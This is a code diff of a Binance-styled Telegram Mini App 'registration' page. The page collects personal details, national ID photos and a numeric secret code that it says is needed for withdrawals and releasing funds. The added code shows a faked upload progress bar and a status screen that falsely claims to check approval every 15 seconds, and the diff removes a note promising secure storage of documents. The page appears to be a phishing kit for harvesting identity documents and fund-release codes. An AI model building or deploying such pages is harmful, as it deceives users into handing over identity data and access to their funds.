@@ -10,7 +10,7 @@
             --bg-color: var(--tg-theme-bg-color, #121212);
             --card-bg: var(--tg-theme-secondary-bg-color, #1e1e1e);
             --text-color: var(--tg-theme-text-color, #ffffff);
-            --button-color: #f0b90b; /* Binance yellow style */
+            --button-color: #f0b90b;
             --button-text: #000000;
         }
         body {
@@ -26,14 +26,14 @@
             width: 100%;
             max-width: 450px;
         }
-        .step-container {
+        .view-section {
             display: none;
             background: var(--card-bg);
             padding: 20px;
             border-radius: 12px;
             box-sizing: border-box;
         }
-        .step-container.active {
+        .view-section.active {
             display: block;
         }
         h2 { font-size: 20px; margin-bottom: 5px; }
@@ -51,7 +51,6 @@
         }
         .note { font-size: 11px; color: #b8860b; margin-top: 4px; }
         
-        /* Upload Box Style */
         .upload-box {
             border: 2px dashed #f0b90b;
             border-radius: 8px;
@@ -97,18 +96,86 @@
             background-color: #333;
             color: #fff;
         }
+
+        /* Modal Overlay */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .modal-card {
+            background: #222;
+            border-radius: 12px;
+            padding: 20px;
+            width: 100%;
+            max-width: 360px;
+            box-sizing: border-box;
+        }
+        .modal-title { color: #f0b90b; font-size: 16px; font-weight: bold; margin-bottom: 10px; }
+        .modal-desc { font-size: 13px; color: #ccc; margin-bottom: 15px; line-height: 1.4; }
+
+        /* Loader Overlay */
+        #loaderModal {
+            text-align: center;
+        }
+        .spinner-circle {
+            width: 70px; height: 70px;
+            border: 5px solid #333;
+            border-top: 5px solid #f0b90b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Status Dashboard Styles */
+        .status-badge {
+            background: #2a2512;
+            border: 1px solid #b8860b;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .info-card {
+            background: #242424;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+        .info-row span:first-child { color: #aaa; }
+        .check-list-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-size: 12px;
+            margin-bottom: 10px;
+            color: #ccc;
+        }
     </style>
 </head>
 <body>
 
 <div class="wrapper">
     <!-- STEP 1 OF 2 -->
-    <div id="step-1" class="step-container active">
+    <div id="view-step-1" class="view-section active">
         <span class="step-indicator">Step 1 of 2</span>
         <h2>Register</h2>
         <p style="font-size: 13px; color: #aaa;">Complete your basic information</p>
         
-        <form id="formStep1" onsubmit="goToStep2(event)">
+        <form onsubmit="goToStep2(event)">
             <div class="form-group">
                 <label>Nickname *</label>
                 <input type="text" id="nickname" required placeholder="Enter nickname">
@@ -156,12 +223,12 @@
     </div>
 
     <!-- STEP 2 OF 2 -->
-    <div id="step-2" class="step-container">
+    <div id="view-step-2" class="view-section">
         <span class="step-indicator">Step 2 of 2</span>
         <h2>Register</h2>
         <p style="font-size: 13px; color: #aaa;">Upload verification documents and set your security code</p>
 
-        <form id="formStep2" onsubmit="completeRegistration(event)">
+        <form onsubmit="promptSecretConfirmation(event)">
             <div class="form-group">
                 <label>National ID - Front Side *</label>
                 <div class="upload-box" id="frontBox">
@@ -197,11 +264,71 @@
                 <button type="button" class="secondary" onclick="goToStep1()">&larr; Back</button>
                 <button type="submit">Complete Registration</button>
             </div>
-            
-            <div class="note" style="margin-top: 15px; background: #2a2512; padding: 10px; border-radius: 6px;">
-                Note: Your documents will be securely stored and used only for verification purposes. After registration, your account will be reviewed by our team.
-            </div>
         </form>
+    </div>
+
+    <!-- STATUS DASHBOARD VIEW -->
+    <div id="view-status" class="view-section">
+        <div style="text-align: center; margin-bottom: 20px;">
+            <div style="font-size: 32px; margin-bottom: 5px;">⏳</div>
+            <h2>Registration Submitted!</h2>
+            <p style="font-size: 13px; color: #f0b90b;">Your account is under review</p>
+        </div>
+
+        <div class="status-badge">
+            <div style="font-weight: bold; font-size: 14px; margin-bottom: 4px;">🟡 Pending Admin Approval</div>
+            <div style="font-size: 11px; color: #bbb;">Our team is reviewing your registration details and documents. This usually takes a few minutes to a few hours.</div>
+        </div>
+
+        <div class="info-card">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <span style="font-weight: bold; font-size: 14px;">Your Profile</span>
+            </div>
+            <div class="info-row"><span>Full Name</span><span id="resFullName"></span></div>
+            <div class="info-row"><span>Binance ID</span><span id="resBinanceId"></span></div>
+            <div class="info-row"><span>Email</span><span id="resEmail"></span></div>
+            <div class="info-row"><span>Phone</span><span id="resPhone"></span></div>
+        </div>
+
+        <div class="info-card">
+            <div style="font-weight: bold; font-size: 14px; margin-bottom: 10px;">What Happens Next?</div>
+            <div class="check-list-item">✅ <div><b>Document Review:</b> Our admin team will verify your identity documents and registration information.</div></div>
+            <div class="check-list-item">✅ <div><b>Account Activation:</b> This page checks automatically. Once approved, you will continue to confirm your secret code and access trading.</div></div>
+            <div class="check-list-item">✅ <div><b>Get Notified:</b> You will receive a Telegram notification when your account is approved.</div></div>
+        </div>
+
+        <div style="text-align: center; font-size: 11px; color: #888; margin-top: 15px;">
+            Checking for approval every 15 seconds
+        </div>
+        <button class="secondary" style="width: 100%; margin-top: 10px;" onclick="alert('Account status: Pending review')">Check Status Now</button>
+    </div>
+</div>
+
+<!-- MODAL: SECRET CODE CONFIRMATION -->
+<div id="secretModal" class="modal-overlay">
+    <div class="modal-card">
+        <div class="modal-title">Do you remember your secret code?</div>
+        <div class="modal-desc">You will need this code for withdrawals and releasing funds. Enter it below to confirm you remember it before we submit your registration.</div>
+        
+        <div class="form-group">
+            <label>Enter your secret code</label>
+            <input type="password" id="modalSecretInput" pattern="[0-9]*" inputmode="numeric" placeholder="Enter code">
+        </div>
+
+        <div class="btn-container" style="margin-top: 15px;">
+            <button type="button" class="secondary" onclick="closeSecretModal()">Cancel</button>
+            <button type="button" onclick="submitRegistrationProcess()">Confirm & Submit</button>
+        </div>
+    </div>
+</div>
+
+<!-- MODAL: LOADING PROGRESS -->
+<div id="loaderModal" class="modal-overlay">
+    <div class="modal-card" style="text-align: center;">
+        <div class="spinner-circle"></div>
+        <div id="loaderPercentage" style="font-size: 22px; font-weight: bold; color: #f0b90b; margin-bottom: 5px;">30%</div>
+        <div style="font-weight: bold; font-size: 15px;">Processing Registration</div>
+        <div id="loaderStatusText" style="font-size: 12px; color: #888; margin-top: 5px;">Uploading documents...</div>
     </div>
 </div>
 
@@ -213,7 +340,6 @@
 
     function goToStep2(e) {
         e.preventDefault();
-        // Collect data from step 1
         formData.nickname = document.getElementById('nickname').value;
         formData.fullName = document.getElementById('fullName').value;
         formData.email = document.getElementById('email').value;
@@ -221,15 +347,14 @@
         formData.binanceId = document.getElementById('binanceId').value;
         formData.referralCode = document.getElementById('referralCode').value;
 
-        // Switch view
-        document.getElementById('step-1').classList.remove('active');
-        document.getElementById('step-2').classList.add('active');
+        document.getElementById('view-step-1').classList.remove('active');
+        document.getElementById('view-step-2').classList.add('active');
         window.scrollTo(0, 0);
     }
 
     function goToStep1() {
-        document.getElementById('step-2').classList.remove('active');
-        document.getElementById('step-1').classList.add('active');
+        document.getElementById('view-step-2').classList.remove('active');
+        document.getElementById('view-step-1').classList.add('active');
         window.scrollTo(0, 0);
     }
 
@@ -243,9 +368,8 @@
         }
     }
 
-    function completeRegistration(event) {
-        event.preventDefault();
-        
+    function promptSecretConfirmation(e) {
+        e.preventDefault();
         const code = document.getElementById('secretCode').value;
         const confirmCode = document.getElementById('confirmCode').value;
 
@@ -253,14 +377,57 @@
             alert('Secret codes do not match!');
             return;
         }
+        formData.secretCode = code;
 
-        formData.telegramUserId = tg.initDataUnsafe?.user?.id || 'unknown';
+        // Open Secret Confirmation Modal
+        document.getElementById('secretModal').style.display = 'flex';
+    }
+
+    function closeSecretModal() {
+        document.getElementById('secretModal').style.display = 'none';
+    }
+
+    function submitRegistrationProcess() {
+        const modalInput = document.getElementById('modalSecretInput').value;
+        if (modalInput !== formData.secretCode) {
+            alert('Incorrect secret code entered!');
+            return;
+        }
+
+        closeSecretModal();
         
-        // Final Submission Logic (Send to backend or use FormData via fetch)
-        alert('Registration submitted successfully! Your account is pending review.');
-        
-        // Close Mini App or redirect
-        // tg.close();
+        // Show Loader Modal
+        const loader = document.getElementById('loaderModal');
+        const percentage = document.getElementById('loaderPercentage');
+        const statusText = document.getElementById('loaderStatusText');
+        loader.style.display = 'flex';
+
+        // Simulate progress steps
+        setTimeout(() => {
+            percentage.innerText = '30%';
+            statusText.innerText = 'Uploading documents...';
+        }, 100);
+
+        setTimeout(() => {
+            percentage.innerText = '90%';
+            statusText.innerText = 'Almost done...';
+        }, 1500);
+
+        setTimeout(() => {
+            loader.style.display = 'none';
+            alert('Registration Successful! Your account is under review. You will be notified once approved.');
+            
+            // Populate Status Dashboard fields
+            document.getElementById('resFullName').innerText = formData.fullName;
+            document.getElementById('resBinanceId').innerText = formData.binanceId;
+            document.getElementById('resEmail').innerText = formData.email;
+            document.getElementById('resPhone').innerText = formData.phoneNumber;
+
+            // Switch to Status View
+            document.getElementById('view-step-2').classList.remove('active');
+            document.getElementById('view-status').classList.add('active');
+            window.scrollTo(0, 0);
+        }, 2800);
     }
 </script>
 
